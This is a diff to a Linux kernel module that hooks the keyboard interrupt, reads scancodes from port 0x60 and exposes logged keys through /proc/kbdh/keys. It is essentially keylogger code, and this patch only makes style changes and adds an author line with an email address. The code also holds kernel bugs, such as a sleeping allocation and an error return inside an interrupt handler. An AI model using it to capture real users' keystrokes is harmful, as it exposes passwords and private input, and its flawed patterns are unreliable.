@@ -24,11 +24,10 @@ irqreturn_t irq_kbdh_handler(int irq, void *dev_id)
 	
 	/* Wait is not possible for us, since this function is called many times */
 	key = (char *)kmalloc(MAX_SIZE, GFP_KERNEL | GFP_NOWAIT);
-	if (key == NULL)
+	if (!key)
 		return -EFAULT;
 
 	spin_lock(&kbdlock);
-
 	scancode = inb(0x60); // byte-width port input
 
 	if (kbd_char(scancode, key) < 0)
@@ -37,9 +36,7 @@ irqreturn_t irq_kbdh_handler(int irq, void *dev_id)
 		goto err;
 
 	append_to_keys(key);
-
 	spin_unlock(&kbdlock);
-
 	kfree(key);
 
 	/* Debugging messages in this function will spam the kernel ring buffer
@@ -61,12 +58,14 @@ static int __init sys_handler_kbd_init(void)
 	parent = proc_mkdir("kbdh", NULL);
 	proc_create("keys", 0, parent, &proc_fops_keys);
 
-	ret = request_irq(IRQ_N, irq_kbdh_handler, IRQF_SHARED, "irq_keyboard", (void *)irq_kbdh_handler);
+	ret = request_irq(IRQ_N, irq_kbdh_handler, IRQF_SHARED, "irq_keyboard",
+						(void *)irq_kbdh_handler);
 	if (ret < 0)
 		return ret;
 
 	if (DEBUG)
-		printk(KERN_INFO "%s: Successfully created an IRQ handler and /proc entry\n", THIS_MODULE->name);
+		printk(KERN_INFO "%s: Successfully created an IRQ handler and /proc entry\n",
+							 THIS_MODULE->name);
 
 	return ret;
 }
@@ -78,6 +77,7 @@ static void __exit sys_handler_kbd_exit(void)
 }
 
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Roi roeil4939@gmail.com");
 
 module_init(sys_handler_kbd_init);
 module_exit(sys_handler_kbd_exit);
